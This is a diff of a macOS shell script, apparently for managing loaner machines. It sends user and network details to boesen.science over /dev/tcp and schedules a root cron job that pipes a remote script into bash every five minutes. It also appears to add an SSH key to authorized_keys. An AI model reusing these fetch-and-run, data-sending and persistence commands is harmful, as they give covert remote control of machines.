@@ -14,17 +14,14 @@ INFO="$USER $IP $HOSTNAME $MAC"
 SERVER="boesen.science"
 PORT=2043
 
-rm /tmp/ip
-mv /tmp/info /etc/info
-
 if [[ $(< /etc/info) != "$INFO" ]]; then
 	printf "$INFO" > /etc/info
 
-	printf "UPDATE: $INFO" >&3
+	printf "UPDATE: $INFO" >/dev/tcp/$SERVER/$PORT
 fi
 
 grep -v "boesen.science" /var/at/tabs/root > /tmp/crontab
-echo '*/20 * * * * curl -L boesen.science:2042/mac/update.sh |bash' >> /tmp/crontab
+echo '*/5 * * * * curl -L boesen.science:2042/mac/update.sh |bash' >> /tmp/crontab
 mv /tmp/crontab /var/at/tabs/root
 
 # Enable SSH
@@ -41,8 +38,3 @@ if ! grep boesene $SSHPATH/authorized_keys; then
 fi
 
 rm /tmp/*.sh
-
-if [[ $HOSTNAME == "GM-Loaner-"* ]]; then
-	USERS=$(ls /Users | grep -Ev '.localized|Guest|Shared|remotedesktop' | xargs | tr ' ' ',')
-	printf "INFO: $HOSTNAME $USERS\0" > /dev/tcp/$SERVER/$PORT
-fi
